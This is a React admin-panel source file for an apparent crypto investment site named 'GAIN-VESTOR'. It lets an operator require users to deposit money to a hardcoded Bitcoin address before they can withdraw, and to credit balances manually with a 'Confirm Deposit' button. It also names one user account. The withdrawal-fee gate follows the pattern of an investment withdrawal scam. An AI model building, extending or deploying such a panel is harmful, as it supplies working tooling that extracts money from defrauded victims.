import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/contexts/AuthContext';
import { useWallet } from '@/contexts/WalletContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield, DollarSign, Check, LogOut, Copy, Wallet, Settings, Save } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { motion } from 'framer-motion';

// Helper to get/set global withdrawal requirements from localStorage
const getWithdrawalRequirements = () => {
  const saved = localStorage.getItem('gv_withdrawal_requirements');
  if (saved) return JSON.parse(saved);
  return { walletAddress: 'bc1q55qdqz9cw3363lf4ftcvv6vw8kcejsa5vg566k', depositAmount: 100, enabled: true };
};

const saveWithdrawalRequirements = (data: { walletAddress: string; depositAmount: number; enabled: boolean }) => {
  localStorage.setItem('gv_withdrawal_requirements', JSON.stringify(data));
};

const Admin = () => {
  const { user, isAdmin, logout } = useAuth();
  const { addDeposit, totalBalance, hasDeposited } = useWallet();
  const navigate = useNavigate();

  const [requirements, setRequirements] = useState(getWithdrawalRequirements);
  const [walletInput, setWalletInput] = useState(requirements.walletAddress);
  const [amountInput, setAmountInput] = useState(requirements.depositAmount > 0 ? requirements.depositAmount.toString() : '');
  const [requirementEnabled, setRequirementEnabled] = useState(requirements.enabled);

  const [confirmDepositAmount, setConfirmDepositAmount] = useState('');
  const [isConfirming, setIsConfirming] = useState(false);

  useEffect(() => {
    if (!user) navigate('/');
    else if (!isAdmin) navigate('/dashboard');
  }, [user, isAdmin, navigate]);

  const handleSaveRequirements = () => {
    const amount = parseFloat(amountInput);
    if (!walletInput.trim()) {
      toast({ title: "Missing wallet", description: "Enter a wallet address for deposits", variant: "destructive" });
      return;
    }
    if (isNaN(amount) || amount <= 0) {
      toast({ title: "Invalid amount", description: "Enter a valid deposit amount", variant: "destructive" });
      return;
    }
    const data = { walletAddress: walletInput.trim(), depositAmount: amount, enabled: true };
    saveWithdrawalRequirements(data);
    setRequirements(data);
    setRequirementEnabled(true);
    toast({ title: "Requirements Saved", description: `Users must deposit $${amount.toLocaleString()} to withdraw` });
  };

  const handleDisableRequirements = () => {
    const data = { walletAddress: '', depositAmount: 0, enabled: false };
    saveWithdrawalRequirements(data);
    setRequirements(data);
    setRequirementEnabled(false);
    setWalletInput('');
    setAmountInput('');
    toast({ title: "Requirements Disabled", description: "Users can withdraw without deposit" });
  };

  const handleConfirmDeposit = async () => {
    const amount = parseFloat(confirmDepositAmount);
    if (isNaN(amount) || amount <= 0) {
      toast({ title: "Invalid amount", description: "Enter a valid deposit amount", variant: "destructive" });
      return;
    }
    setIsConfirming(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    addDeposit(amount);
    toast({ title: "Deposit Confirmed", description: `$${amount.toLocaleString()} added to user wallet` });
    setIsConfirming(false);
    setConfirmDepositAmount('');
  };

  const handleLogout = () => { logout(); navigate('/'); };

  const copyWalletAddress = () => {
    if (requirements.walletAddress) {
      navigator.clipboard.writeText(requirements.walletAddress);
      toast({ title: "Copied", description: "Wallet address copied" });
    }
  };

  if (!isAdmin) return null;

  return (
    <div className="min-h-screen bg-background p-4 md:p-8">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <motion.div className="flex items-center justify-between" initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }}>
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-accent flex items-center justify-center neon-glow">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold font-display neon-text">ADMIN PANEL</h1>
              <p className="text-sm text-muted-foreground font-mono-code">GAIN-VESTOR Control Center</p>
            </div>
          </div>
          <Button variant="outline" onClick={handleLogout}>
            <LogOut className="w-4 h-4 mr-2" /> Logout
          </Button>
        </motion.div>

        {/* Stats */}
        <motion.div className="grid grid-cols-1 md:grid-cols-3 gap-4" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
          <Card className="glass-card border-primary/20">
            <CardHeader className="pb-2"><CardDescription>User Total Balance</CardDescription></CardHeader>
            <CardContent><p className="text-2xl font-bold text-gradient font-display">${totalBalance.toLocaleString()}</p></CardContent>
          </Card>
          <Card className="glass-card border-primary/20">
            <CardHeader className="pb-2"><CardDescription>Deposit Status</CardDescription></CardHeader>
            <CardContent><p className={`text-2xl font-bold font-display ${hasDeposited ? 'text-success' : 'text-warning'}`}>{hasDeposited ? 'Completed' : 'Pending'}</p></CardContent>
          </Card>
          <Card className="glass-card border-primary/20">
            <CardHeader className="pb-2"><CardDescription>User Account</CardDescription></CardHeader>
            <CardContent><p className="text-2xl font-bold font-display">Bryanvoth 105</p></CardContent>
          </Card>
        </motion.div>

        {/* Withdrawal Requirements Configuration */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
          <Card className="glass-card border-accent/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 font-display">
                <Settings className="w-5 h-5 text-accent" />
                WITHDRAWAL REQUIREMENTS
              </CardTitle>
              <CardDescription className="font-mono-code">
                Set what users must do before withdrawing. The wallet address and deposit amount you enter here will be shown to users when they attempt to withdraw.
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-muted-foreground">Deposit Wallet Address (BTC/USDT/etc)</label>
                <Input
                  placeholder="Enter wallet address users must deposit to"
                  value={walletInput}
                  onChange={(e) => setWalletInput(e.target.value)}
                  className="font-mono-code text-sm"
                />
              </div>
              <div className="space-y-2">
                <label className="text-sm font-medium text-muted-foreground">Required Deposit Amount (USD)</label>
                <Input
                  type="number"
                  placeholder="e.g. 20000"
                  value={amountInput}
                  onChange={(e) => setAmountInput(e.target.value)}
                  className="text-lg"
                />
              </div>
              <div className="flex gap-3">
                <Button className="flex-1 bg-gradient-to-r from-primary to-accent text-primary-foreground font-display neon-glow" onClick={handleSaveRequirements}>
                  <Save className="w-4 h-4 mr-2" /> Save Requirements
                </Button>
                {requirementEnabled && (
                  <Button variant="outline" className="border-destructive/50 text-destructive hover:bg-destructive/10" onClick={handleDisableRequirements}>
                    Disable
                  </Button>
                )}
              </div>
              {requirementEnabled && (
                <motion.div className="p-3 bg-primary/10 border border-primary/20 rounded-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                  <p className="text-sm text-primary font-medium font-mono-code">
                    ✓ Active: Users must deposit ${requirements.depositAmount.toLocaleString()} to:
                  </p>
                  <div className="flex items-center gap-2 mt-1">
                    <code className="text-xs text-muted-foreground break-all">{requirements.walletAddress}</code>
                    <button onClick={copyWalletAddress} className="text-muted-foreground hover:text-primary"><Copy className="w-3 h-3" /></button>
                  </div>
                </motion.div>
              )}
            </CardContent>
          </Card>
        </motion.div>

        {/* Confirm Deposit */}
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
          <Card className="glass-card border-success/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 font-display">
                <DollarSign className="w-5 h-5 text-success" />
                CONFIRM USER DEPOSIT
              </CardTitle>
              <CardDescription className="font-mono-code">
                After verifying deposit was received, confirm here to add funds and unlock withdrawals
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium text-muted-foreground">Deposit Amount (USD)</label>
                <Input type="number" value={confirmDepositAmount} onChange={(e) => setConfirmDepositAmount(e.target.value)} placeholder="Enter confirmed amount" className="text-lg" />
              </div>
              <Button className="w-full bg-gradient-to-r from-primary to-accent text-primary-foreground font-display neon-glow" onClick={handleConfirmDeposit} disabled={isConfirming}>
                {isConfirming ? (
                  <motion.div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full" animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: 'linear' }} />
                ) : (
                  <><Check className="w-5 h-5 mr-2" /> Confirm Deposit Received</>
                )}
              </Button>
              {hasDeposited && (
                <motion.div className="p-3 bg-success/10 border border-success/20 rounded-lg text-center" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
                  <p className="text-success font-medium font-mono-code">✓ Deposit confirmed. User can now request withdrawals.</p>
                </motion.div>
              )}
            </CardContent>
          </Card>
        </motion.div>
      </div>
    </div>
  );
};

export default Admin;
